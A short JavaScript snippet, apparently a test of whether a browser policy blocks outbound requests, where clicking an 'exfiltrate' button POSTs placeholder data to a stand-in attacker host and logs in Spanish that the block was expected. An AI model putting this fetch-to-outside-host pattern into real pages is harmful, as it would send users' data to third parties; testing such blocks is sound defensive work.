

document.addEventListener('DOMContentLoaded', function() {
  document.getElementById('exfiltrate').addEventListener('click', function() {
    fetch('https://evil-data-collector.example.com/collect', {
      method: 'POST',
      body: JSON.stringify({ data: 'sensitive' })
    }).catch(e => {
      console.log('Conexión bloqueada como se esperaba:', e);
    });
  });
});


